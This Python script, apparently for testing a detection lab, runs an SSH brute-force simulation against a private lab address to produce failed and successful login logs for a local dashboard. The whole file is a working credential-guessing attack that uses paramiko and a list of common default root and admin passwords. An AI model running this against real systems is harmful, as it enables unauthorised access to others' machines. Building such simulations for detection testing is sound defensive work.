# brute_force_test.py
import paramiko
import time

TARGET_IP   = "192.168.56.101"
TARGET_PORT = 22

# Mix of rejected passwords (logs as failed) + one that works at the end
credentials = [
    ("root", "root"),         # rejected - logs as failed
    ("root", "123456"),       # rejected - logs as failed
    ("root", "admin"),        # rejected - logs as failed
    ("root", "password"),     # rejected - logs as failed
    ("root", "toor"),         # rejected - logs as failed
    ("admin", "admin"),       # rejected - logs as failed
    ("admin", "password"),    # rejected - logs as failed
    ("root", "qwerty"),       # rejected - logs as failed
    ("root", "letmein"),      # rejected - logs as failed
    ("root", "abc123"),       # rejected - logs as failed
    ("root", "pass123"),      # rejected - logs as failed
    ("root", "dragon"),       # rejected - logs as failed
    ("root", "master"),       # rejected - logs as failed
    ("root", "shadow"),       # rejected - logs as failed
    ("root", "superman"),     # rejected - logs as failed
    ("root", "batman"),       # rejected - logs as failed
    ("root", "iloveyou"),     # rejected - logs as failed
    ("root", "sunshine"),     # rejected - logs as failed
    ("root", "princess"),     # rejected - logs as failed
    ("root", "hello"),        # ACCEPTED - logs as success
]

print(f"🔴 Starting brute force simulation against {TARGET_IP}...")
print(f"   Attempting {len(credentials)} credential combinations\n")

success_count = 0
failed_count  = 0

for username, password in credentials:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            TARGET_IP, port=TARGET_PORT,
            username=username, password=password,
            timeout=5, banner_timeout=5
        )
        print(f"  ✅ [SUCCESS] {username}:{password}")
        success_count += 1
        client.close()
    except paramiko.AuthenticationException:
        print(f"  ❌ [FAILED]  {username}:{password}")
        failed_count += 1
    except Exception as e:
        print(f"  ⚠️  [ERROR]   {username}:{password} → {e}")
    time.sleep(0.5)

print(f"\n{'='*50}")
print(f"  Brute Force Complete")
print(f"  Successful logins : {success_count}")
print(f"  Failed attempts   : {failed_count}")
print(f"  Total attempts    : {len(credentials)}")
print(f"  Check dashboard   : http://localhost:3000")
print(f"{'='*50}")